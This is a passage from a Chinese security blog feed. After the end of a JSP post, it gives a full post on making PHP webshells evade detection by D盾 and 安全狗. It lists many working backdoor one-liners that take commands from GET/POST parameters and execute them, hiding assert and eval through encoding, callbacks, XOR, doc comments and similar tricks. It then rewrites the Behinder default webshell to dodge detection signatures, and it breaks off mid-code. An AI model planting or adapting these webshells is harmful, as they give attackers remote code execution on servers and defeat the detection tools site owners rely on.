class="hljs-constructor">Instance()</span>.equals(pageContext);<br>&#125;%&gt;<br></code></pre></td></tr></table></figure><p>最终D盾对本文提到的多种webshell都是可以免杀的</p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/webshell_bypass/jsp_01.png"></p><h2 id="参考文档"><a href="#参考文档" class="headerlink" title="参考文档"></a>参考文档</h2><p><a href="https://yzddmr6.tk/posts/webshell-bypass-jsp/">https://yzddmr6.tk/posts/webshell-bypass-jsp/</a></p>]]></content>
    
    
    <categories>
      
      <category>bypass</category>
      
    </categories>
    
    
    <tags>
      
      <tag>bypass</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>webshell免杀研究php篇</title>
    <link href="/2021/05/11/webshell%E5%85%8D%E6%9D%80%E7%A0%94%E7%A9%B6php%E7%AF%87/"/>
    <url>/2021/05/11/webshell%E5%85%8D%E6%9D%80%E7%A0%94%E7%A9%B6php%E7%AF%87/</url>
    
    <content type="html"><![CDATA[<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>向服务器端发送恶意代码写成的文件(即：shell)，客户端通过远程连接，利用shell连接到服务器，并可对服务器进行操作。</p><h2 id="结构"><a href="#结构" class="headerlink" title="结构"></a>结构</h2><p>实现两步</p><ol><li>数据的传递</li><li>执行所传递的数据</li></ol><h3 id="数据的传递"><a href="#数据的传递" class="headerlink" title="数据的传递"></a>数据的传递</h3><h4 id="1-http请求中获取数据"><a href="#1-http请求中获取数据" class="headerlink" title="1.http请求中获取数据"></a>1.http请求中获取数据</h4><p>$_GET、$_POST、$_COOKIES、$_FILE…HTTP包中的任何位置都可以作为payload的传输媒介　　</p><h4 id="2-从远程远程URL中获取数据"><a href="#2-从远程远程URL中获取数据" class="headerlink" title="2.从远程远程URL中获取数据"></a>2.从远程远程URL中获取数据</h4><p>file_get_contents、curl、svn_checkout…将需要执行的指令数据放在远程URL中，通过URL_INCLUDE来读取　　</p><h4 id="3-从磁盘文件中获取数据"><a href="#3-从磁盘文件中获取数据" class="headerlink" title="3.从磁盘文件中获取数据"></a>3.从磁盘文件中获取数据</h4><p>file、file_get_contents…将需要执行的指令数据放在磁盘文件中，利用IO函数来读取　　</p><h4 id="4-从数据库中读取"><a href="#4-从数据库中读取" class="headerlink" title="4.从数据库中读取"></a>4.从数据库中读取</h4><p>将需要执行的指令放在数据库中，利用数据库函数来读取　　</p><h4 id="5-从图片头部中获取"><a href="#5-从图片头部中获取" class="headerlink" title="5.从图片头部中获取"></a>5.从图片头部中获取</h4><p>exif_read_data…将需要执行的指令数据放在图片头部中，利用图片操作函数来读取</p><h3 id="代码执行-将用户传输的数据进行执行"><a href="#代码执行-将用户传输的数据进行执行" class="headerlink" title="代码执行(将用户传输的数据进行执行)"></a>代码执行(将用户传输的数据进行执行)</h3><h4 id="1-常用命令执行函数"><a href="#1-常用命令执行函数" class="headerlink" title="1. 常用命令执行函数"></a>1. 常用命令执行函数</h4><p>eval、system…执行(这是最普通、标准的代码执行)</p><h4 id="2-LFI"><a href="#2-LFI" class="headerlink" title="2. LFI"></a>2. LFI</h4><p>include、require…(利用浏览器的伪协议将文件包含转化为代码执行)</p><h4 id="3-动态函数执行"><a href="#3-动态函数执行" class="headerlink" title="3. 动态函数执行"></a>3. 动态函数执行</h4><p>($()…PHP的动态函数特性)</p><h4 id="4-Curly-Syntax"><a href="#4-Curly-Syntax" class="headerlink" title="4. Curly Syntax"></a>4. Curly Syntax</h4><p>(${${…}}…这种思路可以把变量赋值的漏洞转化为代码执行的机会)<br>　　<br>ps：<br>PHP执行命令方法<br>　　eval、passthru、system、assert、popen、exec、shell_exec</p><h2 id="应对的杀毒软件"><a href="#应对的杀毒软件" class="headerlink" title="应对的杀毒软件"></a>应对的杀毒软件</h2><p>目前专业查杀webshell的软件是D盾、网站安全狗、护卫神等。</p><p>其他需要注意的主机上的杀毒软件有最常用的火绒和360，但这类杀毒软件对webshell针对性不强，一般识别不到。</p><p>所以目前制作免杀，主要还是针对D盾、安全狗等产品。</p><h2 id="免杀思路"><a href="#免杀思路" class="headerlink" title="免杀思路"></a>免杀思路</h2><p>目前一句话webshell的查杀一般是通过特征查杀的，捕捉其结构中关键的两步，当检查到传入的参数被放在危险的命令执行方法中执行时，就会报后门。</p><p>所以需要分析这些查杀软件对哪些关键语句敏感，可以通过二分法寻找各个敏感的位置，然后通过其他方式重写这段会被检出的关键字或关键语句，就可初步达到免杀效果。</p><p>php5通常通过回调函数，编码拼接替换异或生成assert等方式实现免杀</p><p>php7常用$x($y)模式，$x为执行函数名，$y为参数。通过多层构造拼接，替换，移位，异或编码等方式去除特征，构造$x参数为eval，assert等，再通过这些方式去除GET POST REQUEST等入参方式，最后将入参变量传递给$y。</p><h3 id="字符串变形"><a href="#字符串变形" class="headerlink" title="字符串变形"></a>字符串变形</h3><p>安全狗、D盾等查杀webshell时对执行命令的方法是最着重关注的，应对这种情况比较好用的免杀方式是在代码中不出现eval或assert等关键字</p><p>由于eval是语言构造器而不是函数，所以不能被可变函数调用，一般会通过拼接assert来执行</p><p>如</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">#php5</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span>=<span class="hljs-string">&quot;a&quot;</span>;<br><span class="hljs-variable">$b</span>=<span class="hljs-string">&quot;sse&quot;</span>;<br><span class="hljs-variable">$c</span>=<span class="hljs-string">&quot;00&quot;</span>;<br><span class="hljs-variable">$d</span>= substr_replace(<span class="hljs-variable">$a</span>.<span class="hljs-variable">$b</span>.<span class="hljs-variable">$c</span>,<span class="hljs-string">&quot;rt&quot;</span>,<span class="hljs-number">4</span>);<br><span class="hljs-variable">$d</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;a&#x27;</span>];<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>其余的字符串变形方式有：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">ucwords</span><span class="hljs-params">()</span></span> <span class="hljs-comment">//函数把字符串中每个单词的首字符转换为大写。</span><br><span class="hljs-function"><span class="hljs-title">ucfirst</span><span class="hljs-params">()</span></span> <span class="hljs-comment">//函数把字符串中的首字符转换为大写。</span><br><span class="hljs-function"><span class="hljs-title">trim</span><span class="hljs-params">()</span></span> <span class="hljs-comment">//函数从字符串的两端删除空白字符和其他预定义字符。</span><br><span class="hljs-function"><span class="hljs-title">substr_replace</span><span class="hljs-params">()</span></span> <span class="hljs-comment">//函数把字符串的一部分替换为另一个字符串</span><br><span class="hljs-function"><span class="hljs-title">substr</span><span class="hljs-params">()</span></span> <span class="hljs-comment">//函数返回字符串的一部分。</span><br><span class="hljs-function"><span class="hljs-title">strtr</span><span class="hljs-params">()</span></span> <span class="hljs-comment">//函数转换字符串中特定的字符。</span><br><span class="hljs-function"><span class="hljs-title">strtoupper</span><span class="hljs-params">()</span></span> <span class="hljs-comment">//函数把字符串转换为大写。</span><br><span class="hljs-function"><span class="hljs-title">strtolower</span><span class="hljs-params">()</span></span> <span class="hljs-comment">//函数把字符串转换为小写。</span><br><span class="hljs-function"><span class="hljs-title">strtok</span><span class="hljs-params">()</span></span> <span class="hljs-comment">//函数把字符串分割为更小的字符串</span><br><span class="hljs-function"><span class="hljs-title">str_rot13</span><span class="hljs-params">()</span></span> <span class="hljs-comment">//函数对字符串执行 ROT13 编码。</span><br></code></pre></td></tr></table></figure><p>但由于assert在php7.1之后无法这样使用，所以此类免杀方式基本仅能在php5环境下使用</p><h3 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h3><p>编码也是一种替换敏感字段的方式，一般用到base64、ascii等各种方式</p><p>如ascii：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">#php5</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span> =  chr(<span class="hljs-number">98</span>-<span class="hljs-number">1</span>).chr(<span class="hljs-number">116</span>-<span class="hljs-number">1</span>).chr(<span class="hljs-number">116</span>-<span class="hljs-number">1</span>).chr(<span class="hljs-number">103</span>-<span class="hljs-number">2</span>).chr(<span class="hljs-number">112</span>+<span class="hljs-number">2</span>).chr(<span class="hljs-number">110</span>+<span class="hljs-number">6</span>);<span class="hljs-comment">#assert</span><br><span class="hljs-variable">$a</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;a&#x27;</span>];<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>如base64：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">#php5</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span> = base64_decode(<span class="hljs-string">&quot;YX__Nz_ZX____J0&quot;</span>);<br><span class="hljs-variable">$a</span>(<span class="hljs-variable">$_POST</span>[x]);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>其中php中base64函数不会对下划线做处理，可以任意位置添加下划线干扰。</p><p>但如上两种仍然是assert方式，仅能用于php5。</p><p>目前php7中可以直接将eval函数放出来，将输入函数进行编码，虽然D盾等看到eval就会报告低级别的可疑但是仍然能使用，且网站安全狗不会阻碍执行。</p><p>如</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">#php5/php7</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$_1</span> = base64_decode(<span class="hljs-string">&quot;X1B____PU1_____Q=___&quot;</span>);<br><span class="hljs-variable">$_2</span>=$&#123;<span class="hljs-variable">$_1</span>&#125;[a];<br><span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_2</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h3 id="定义函数"><a href="#定义函数" class="headerlink" title="定义函数"></a>定义函数</h3><p>此类方法是在一个自定义函数中执行assert、eval等，或在函数中进行输入传入$_POST $_GET等，但是目前这种方法几乎已经无法免杀了。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">a</span>(<span class="hljs-params"><span class="hljs-variable">$a</span></span>)</span>&#123;<br>    <span class="hljs-variable">$a</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;x&#x27;</span>]);<br>&#125;<br>a(assert);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h3 id="回调函数"><a href="#回调函数" class="headerlink" title="回调函数"></a>回调函数</h3><p>php5常用回调函数结合各种方式隐藏assert来执行命令</p><p>assert同样可使用各种字符处理方式，拼接，替换，移位，异或等方式去除特征</p><p>回调函数可用以下的列表</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">call_user_func_array</span><span class="hljs-params">()</span></span><br><span class="hljs-function"><span class="hljs-title">call_user_func</span><span class="hljs-params">()</span></span><br><span class="hljs-function"><span class="hljs-title">array_filter</span><span class="hljs-params">()</span></span> <br><span class="hljs-function"><span class="hljs-title">array_walk</span><span class="hljs-params">()</span></span> array_map()<br><span class="hljs-function"><span class="hljs-title">registregister_shutdown_function</span><span class="hljs-params">()</span></span><br><span class="hljs-function"><span class="hljs-title">register_tick_function</span><span class="hljs-params">()</span></span><br><span class="hljs-function"><span class="hljs-title">filter_var</span><span class="hljs-params">()</span></span> <br><span class="hljs-function"><span class="hljs-title">filter_var_array</span><span class="hljs-params">()</span></span> <br><span class="hljs-function"><span class="hljs-title">uasort</span><span class="hljs-params">()</span></span> <br><span class="hljs-function"><span class="hljs-title">uksort</span><span class="hljs-params">()</span></span> <br><span class="hljs-function"><span class="hljs-title">array_reduce</span><span class="hljs-params">()</span></span><br><span class="hljs-function"><span class="hljs-title">array_walk</span><span class="hljs-params">()</span></span> <br><span class="hljs-function"><span class="hljs-title">array_walk_recursive</span><span class="hljs-params">()</span></span><br></code></pre></td></tr></table></figure><p>如array_map:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">username</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function"></span>&#123;<br><br><span class="hljs-variable">$a</span> =  chr(<span class="hljs-number">98</span>-<span class="hljs-number">1</span>).chr(<span class="hljs-number">116</span>-<span class="hljs-number">1</span>).chr(<span class="hljs-number">116</span>-<span class="hljs-number">1</span>).chr(<span class="hljs-number">103</span>-<span class="hljs-number">2</span>).chr(<span class="hljs-number">112</span>+<span class="hljs-number">2</span>).chr(<span class="hljs-number">110</span>+<span class="hljs-number">6</span>);<span class="hljs-comment">#assert</span><br><span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#x27;</span>.<span class="hljs-variable">$a</span>;<br>&#125;<br><span class="hljs-variable">$user</span> = username();<br><span class="hljs-variable">$pass</span> =<span class="hljs-keyword">array</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>]);<br>array_map(<span class="hljs-variable">$user</span>,<span class="hljs-variable">$user</span> = <span class="hljs-variable">$pass</span> );<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>如call_user_func_array:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span> =  chr(<span class="hljs-number">98</span>-<span class="hljs-number">1</span>).chr(<span class="hljs-number">116</span>-<span class="hljs-number">1</span>).chr(<span class="hljs-number">116</span>-<span class="hljs-number">1</span>).chr(<span class="hljs-number">103</span>-<span class="hljs-number">2</span>).chr(<span class="hljs-number">112</span>+<span class="hljs-number">2</span>).chr(<span class="hljs-number">110</span>+<span class="hljs-number">6</span>);<br>call_user_func_array(<span class="hljs-variable">$a</span>, <span class="hljs-keyword">array</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>]));<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>此类方法仅适用php5，目前较有效，D盾可能会对回调函数报低级别可疑</p><h3 id="特殊字符干扰"><a href="#特殊字符干扰" class="headerlink" title="特殊字符干扰"></a>特殊字符干扰</h3><p>可增加各种无效特殊字符对规则干扰，如null，\n，以及base64中的下划线都是同样的意思</p><p>如使用下划线无意义的null拼接干扰规则：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$_1</span> = base64_decode(<span class="hljs-string">&quot;X1B____PU1_____Q=___&quot;</span>);<br><span class="hljs-variable">$_2</span>=$&#123;<span class="hljs-variable">$_1</span>&#125;[a];<br><span class="hljs-variable">$_3</span>=<span class="hljs-literal">null</span>;<br><span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_3</span>.<span class="hljs-variable">$_2</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>这种方式目前单独使用也对免杀没有太大帮助了，但是可以组合别的方式使用。</p><h3 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h3><p>将执行代码放在数组中,配合其他绕过手段就仍然有效</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span> = substr_replace(<span class="hljs-string">&quot;asse00&quot;</span>,<span class="hljs-string">&quot;rt&quot;</span>,<span class="hljs-number">4</span>);<br><span class="hljs-variable">$b</span>=<span class="hljs-keyword">array</span>(<span class="hljs-variable">$array</span>=<span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;&#x27;</span>=&gt;<span class="hljs-variable">$a</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;x&#x27;</span>])));<br>var_dump(<span class="hljs-variable">$b</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h3 id="类"><a href="#类" class="headerlink" title="类"></a>类</h3><p>php类中使用魔术方法执行，单独使用也高概率被查杀，可以组合其他免杀方式</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Student</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$_1</span>=<span class="hljs-string">&#x27;&#x27;</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        assert(<span class="hljs-string">&quot;<span class="hljs-subst">$this</span>-&gt;a&quot;</span>);<br>    &#125;<br>&#125;<br><span class="hljs-variable">$_2</span> = <span class="hljs-keyword">new</span> Student;<br><span class="hljs-variable">$_2</span>-&gt;<span class="hljs-variable">$_1</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;a&#x27;</span>];<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h3 id="注册本地变量"><a href="#注册本地变量" class="headerlink" title="注册本地变量"></a>注册本地变量</h3><p>这种方式目前未被查杀，但是可执行的命令有限制</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>  <span class="hljs-variable">$a</span>=<span class="hljs-number">1</span>;<span class="hljs-variable">$b</span>=<span class="hljs-string">&quot;a=&quot;</span>.<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>];parse_str(<span class="hljs-variable">$b</span>);print_r(`<span class="hljs-variable">$a</span>`)<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h3 id="注释获取"><a href="#注释获取" class="headerlink" title="注释获取"></a>注释获取</h3><p>ReflectionClass::getDocComment — 获取文档注释</p><p>某些安全软件会忽略注释中的代码，所以这种方式是将恶意代码写入注释中，再通过ReflectionClass的getDocComment方法将其提取出来执行，但是非注释内容中也会存在eval或assert，可能会被报低级别可疑。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>  <br>    <span class="hljs-comment">/**   </span><br><span class="hljs-comment">    * assert($_GET[1+0]);</span><br><span class="hljs-comment">    */</span>  <br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span> </span>&#123; &#125;  <br>    <span class="hljs-variable">$user</span> = <span class="hljs-keyword">new</span> ReflectionClass(<span class="hljs-string">&#x27;User&#x27;</span>);<br>    <span class="hljs-variable">$comment</span> = <span class="hljs-variable">$user</span>-&gt;getDocComment();<br><span class="hljs-variable">$d</span> = substr(<span class="hljs-variable">$comment</span> , <span class="hljs-number">14</span> , <span class="hljs-number">20</span>);<br>assert(<span class="hljs-variable">$d</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h3 id="异或等无字符特征"><a href="#异或等无字符特征" class="headerlink" title="异或等无字符特征"></a>异或等无字符特征</h3><p>由于每一个字符都可由多组不同的两个字符异或而来，所以可以生成多个特征完全不同的木马。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$_1</span>=<span class="hljs-string">&#x27;_&#x27;</span>.(hex2bin(<span class="hljs-string">&quot;10&quot;</span>)^<span class="hljs-string">&quot;@&quot;</span>).(hex2bin(<span class="hljs-string">&quot;0F&quot;</span>)^<span class="hljs-string">&quot;@&quot;</span>).(hex2bin(<span class="hljs-string">&quot;13&quot;</span>)^<span class="hljs-string">&quot;@&quot;</span>).(hex2bin(<span class="hljs-string">&quot;14&quot;</span>)^<span class="hljs-string">&quot;@&quot;</span>);<br><span class="hljs-variable">$_2</span>=$&#123;<span class="hljs-variable">$_1</span>&#125;[a];<br><span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_2</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h2 id="冰蝎改造"><a href="#冰蝎改造" class="headerlink" title="冰蝎改造"></a>冰蝎改造</h2><p>冰蝎的动态二进制加密webshell是非常好的思路，冰蝎客户端自带的其他功能也较好用，有较多的安全从业者在使用，所以其自带的默认马已经完全无法免杀了。</p><p>不过由于大部分安全软件对其检测方式都是取默认马中的几段特征，用二分法很容易找到特征所在位置，只要将其特征位置替换为相同功能的语句即可免杀。</p><p>冰蝎默认马</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>@error_reporting(<span class="hljs-number">0</span>);<br>session_start();<br>    <span class="hljs-variable">$key</span>=<span class="hljs-string">&quot;e45e329feb5d925b&quot;</span>; <span class="hljs-comment">//该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond</span><br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;k&#x27;</span>]=<span class="hljs-variable">$key</span>;<br><span class="hljs-variable">$post</span>=file_get_contents(<span class="hljs-string">&quot;php://input&quot;</span>);<br><span class="hljs-keyword">if</span>(!extension_loaded(<span class="hljs-string">&#x27;openssl&#x27;</span>))<br>&#123;<br><span class="hljs-variable">$t</span>=<span class="hljs-string">&quot;base64_&quot;</span>.<span class="hljs-string">&quot;decode&quot;</span>;<br><span class="hljs-variable">$post</span>=<span class="hljs-variable">$t</span>(<span class="hljs-variable">$post</span>.<span class="hljs-string">&quot;&quot;</span>);<br><br><span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$i</span>&lt;strlen(<span class="hljs-variable">$post</span>);<span class="hljs-variable">$i</span>++) &#123;<br>     <span class="hljs-variable">$post</span>[<span class="hljs-variable">$i</span>] = <span class="hljs-variable">$post</span>[<span class="hljs-variable">$i</span>]^<span class="hljs-variable">$key</span>[<span class="hljs-variable">$i</span>+<span class="hljs-number">1</span>&amp;<span class="hljs-number">15</span>]; <br>    &#125;<br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br><span class="hljs-variable">$post</span>=openssl_decrypt(<span class="hljs-variable">$post</span>, <span class="hljs-string">&quot;AES128&quot;</span>, <span class="hljs-variable">$key</span>);<br>&#125;<br>    <span class="hljs-variable">$arr</span>=explode(<span class="hljs-string">&#x27;|&#x27;</span>,<span class="hljs-variable">$post</span>);<br>    <span class="hljs-variable">$func</span>=<span class="hljs-variable">$arr</span>[<span class="hljs-number">0</span>];<br>    <span class="hljs-variable">$params</span>=<span class="hljs-variable">$arr</span>[<span class="hljs-number">1</span>];<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">C</span></span>&#123;<span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"><span class="hljs-variable">$p</span></span>) </span>&#123;<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$p</span>.<span class="hljs-string">&quot;&quot;</span>);&#125;&#125;<br>    @call_user_func(<span class="hljs-keyword">new</span> C(),<span class="hljs-variable">$params</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>直接使用D盾扫描该文件，报五级可疑，已知后门，通过多次二分法发现</p><p>目前D盾识别冰蝎用到的特征是以下三处：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php">特征一<br><span class="hljs-variable">$post</span>=file_get_contents(<span class="hljs-string">&quot;php://input&quot;</span>);<br>特征二<br><span class="hljs-variable">$post</span>[<span class="hljs-variable">$i</span>] = <span class="hljs-variable">$post</span>[<span class="hljs-variable">$i</span>]^<span class="hljs-variable">$key</span>[<span class="hljs-variable">$i</span>+<span class="hljs-number">1</span>&amp;<span class="hljs-number">15</span>]; <br>特征三<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">C</span></span>&#123;<span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"><span class="hljs-variable">$p</span></span>) </span>&#123;<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$p</span>.<span class="hljs-string">&quot;&quot;</span>);&#125;&#125;<br>@call_user_func(<span class="hljs-keyword">new</span> C(),<span class="hljs-variable">$params</span>);<br></code></pre></td></tr></table></figure><p>分别去除发现第三处是最严格的特征，将第三处重写为</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">C</span></span>&#123;<span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$p</span></span>) </span>&#123;<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$p</span>.<span class="hljs-string">&quot;&quot;</span>);&#125;&#125;<br>@<span class="hljs-keyword">new</span> C(<span class="hljs-variable">$params</span>);<br></code></pre></td></tr></table></figure><p>发现D盾报告降到3级可疑，可疑的位置是file_get_contents\openssl等关键字</p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/webshell_bypass/php_01.png"></p><p>我们可以通过多种之前提到的字符串处理方法处理这种类型的特征，此处我使用逆序函数处理</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs arcade"><span class="hljs-number">1.</span><br><span class="hljs-symbol">$post</span>=file_get_contents(<span class="hljs-string">&quot;php://input&quot;</span>);<br>修改为<br><span class="hljs-symbol">$post</span>=(strrev(<span class="hljs-string">&quot;stnetnoc_teg_elif&quot;</span>))(strrev(<span class="hljs-string">&quot;tupni//:php&quot;</span>));<br><br><span class="hljs-number">2.</span><br><span class="hljs-keyword">if</span>(!extension_loaded(<span class="hljs-string">&#x27;openssl&#x27;</span>))<br>修改为<br><span 